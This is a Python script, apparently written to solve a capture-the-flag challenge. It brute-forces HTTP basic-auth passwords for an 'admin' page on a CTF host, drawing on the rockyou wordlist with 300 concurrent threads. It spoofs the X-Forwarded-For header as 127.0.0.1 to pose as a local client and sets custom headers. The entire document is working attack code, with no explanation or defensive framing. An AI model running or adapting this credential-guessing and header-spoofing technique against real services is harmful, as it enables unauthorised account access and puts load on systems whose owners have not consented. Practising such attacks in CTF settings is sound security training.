import requests
import numpy as np
import threading
from tqdm import tqdm
tn = 300
lines = open("./debug/rockyou.txt", "r", encoding="latin-1").readlines()
lines.reverse()
splits = np.array_split(lines, tn)
pbar = tqdm(total=len(lines))


def request(i):
    lines = splits[i]
    for idx, pw in enumerate(lines):
        r = requests.get('http://ctf.adl.tw:12002/admin',
                         headers={"X-Forwarded-For": "127.0.0.1",
                                  "User-Agent": "STARRYBrowser",
                                  "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
        if len(r.text) != 1370:
            print(pw)
            with open('pw.txt', 'w') as f:
                f.write(pw)
            #break
            exit()
        #if idx % 100 == (100 * i) / tn:
        if idx % 100 == 0:
            pbar.update(100)


for i in range(tn):
    t = threading.Thread(target=request, args=(i,))
    t.start()